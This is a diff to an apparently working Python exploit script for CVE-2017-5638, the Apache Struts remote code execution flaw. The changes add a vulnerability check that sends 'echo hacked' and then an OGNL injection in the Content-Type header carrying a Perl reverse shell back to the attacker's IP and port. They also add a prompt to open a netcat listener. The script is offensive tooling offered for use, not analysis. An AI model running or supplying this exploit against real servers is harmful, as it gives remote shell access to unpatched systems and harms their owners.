@@ -40,8 +40,6 @@ class CVE_2017_5638():
         self.target = p_target
         self.ip = p_ip
         self.port = p_port
-        self.revshell = self.generate_revshell()
-        self.payload = self.generate_payload()
         self.exploit()
 
     def generate_revshell(self):
@@ -52,7 +50,7 @@ class CVE_2017_5638():
                    "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\\'"
         return revshell.format(self.ip, self.port)
 
-    def generate_payload(self):
+    def generate_payload(self, p_cmd):
         payload = "%{{(#_='multipart/form-data')."\
                   "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
                   "(#_memberAccess?"\
@@ -75,9 +73,9 @@ class CVE_2017_5638():
                   "Response().getOutputStream()))."\
                   "(@org.apache.commons.io.IOUtils@copy"\
                   "(#process.getInputStream(),#ros)).(#ros.flush())}}"
-        return payload.format(self.revshell)
+        return payload.format(p_cmd)
 
-    def exploit(self):
+    def send_xpl(self, p_payload):
         try:
             # Set proxy for debug request, just uncomment these lines 
             # Change the proxy port
@@ -89,14 +87,24 @@ class CVE_2017_5638():
             headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'
                                      ' AppleWebKit/537.36 (KHTML, like Gecko)'
                                      ' Chrome/55.0.2883.87 Safari/537.36',
-                       'Content-Type': self.payload}
+                       'Content-Type': p_payload}
             xpl = urllib2.Request(self.target, headers=headers)
             body = urllib2.urlopen(xpl).read()
         except httplib.IncompleteRead as b:
             body = b.partial
-        print body
+        return body
 
 
+    def exploit(self):
+        cmd = 'echo hacked'
+        resp = self.send_xpl(self.generate_payload(cmd))
+        if 'hacked' in resp:
+            print '\n[+] Target vulnerable!!..'
+            print '[+] Attempting reverse connection.. '\
+                  'Make sure you open port:'\
+                  ' $ nc -lnvp <port>'
+            self.send_xpl(self.generate_payload(self.generate_revshell()))
+        
 def main():
     try:
         arguments = docopt(__doc__, version="Apache Strunts RCE Exploit")
